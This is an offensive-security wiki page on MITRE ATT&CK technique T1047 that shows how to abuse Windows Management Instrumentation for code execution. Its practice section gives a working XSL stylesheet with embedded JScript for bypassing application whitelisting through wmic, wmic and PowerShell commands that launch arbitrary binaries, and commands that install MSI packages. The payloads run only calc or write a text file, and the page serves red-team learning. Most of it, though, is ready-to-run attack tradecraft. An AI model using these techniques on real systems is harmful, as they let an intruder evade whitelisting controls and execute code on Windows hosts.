---
description: MITRE ATT&CK™  Windows Management Instrumentation - Technique T1047
---

# WMI

## Theory

Windows Management Instrumentation (WMI) provides a standardized way for querying and managing various elements of a Windows operating system. It allow administrators to perform standard management tasks that attackers can abuse to perform code execution.

We can use WMI to execute binary, commands, msi, services, scheduled tasks or XSL file that contain javascript payload with WMIC.

## Practice

{% tabs %}
{% tab title="XSL" %}
Another application whitelist bypassing technique discovered by Casey @subTee, similar to squiblydoo

Define the XSL file containing the jscript payload:

```bash
#evil.xsl
<?xml version='1.0'?>
<stylesheet
xmlns="http://www.w3.org/1999/XSL/Transform" xmlns:ms="urn:schemas-microsoft-com:xslt"
xmlns:user="placeholder"
version="1.0">
<output method="text"/>
	<ms:script implements-prefix="user" language="JScript">
	<![CDATA[
	var r = new ActiveXObject("WScript.Shell").Run("calc");
	]]> </ms:script>
</stylesheet>
```

Invoke wmic command and specify /format pointing to the evil.xsl:

```bash
wmic os get /FORMAT:"evil.xsl"
```
{% endtab %}

{% tab title="Commands" %}
Execute a local binary or a command using wmic.exe

```bash
wmic.exe process call create "C:\Windows\Temp\evil.exe"
wmic.exe process call create "cmd.exe /c calc.exe"
```

Or we may use powershell&#x20;

```powershell
#Execute a command remotely 
$Command = "powershell.exe -Command Set-Content -Path C:\text.txt -Value munrawashere";

#Powershell v1+
Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList $Command

#Powershell v3+
Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{ CommandLine = $Command }
```
{% endtab %}

{% tab title="MSI" %}
Install a msi package using wmic.exe

```bash
wmic product call install PackageLocation=c:\Windows\myinstaller.msi
```

Or we may use powershell

```powershell
#Powershell v1+
Invoke-WmiMethod -Path win32_product -name install -argumentlist @($true,"","C:\Windows\myinstaller.msi")

#Powershell v3+
Invoke-CimMethod -ClassName Win32_Product -MethodName Install -Arguments @{PackageLocation = "C:\Windows\myinstaller.msi"; Options = ""; AllUsers = $false}
```
{% endtab %}
{% endtabs %}

You may want to check this page for remote WMI execution :&#x20;

{% content-ref url="../../pivoting/remote-wmi.md" %}
[remote-wmi.md](../../pivoting/remote-wmi.md)
{% endcontent-ref %}

## Resources

{% embed url="https://tryhackme.com/room/livingofftheland" %}

{% embed url="https://www.ired.team/offensive-security/code-execution/application-whitelisting-bypass-with-wmic-and-xsl" %}
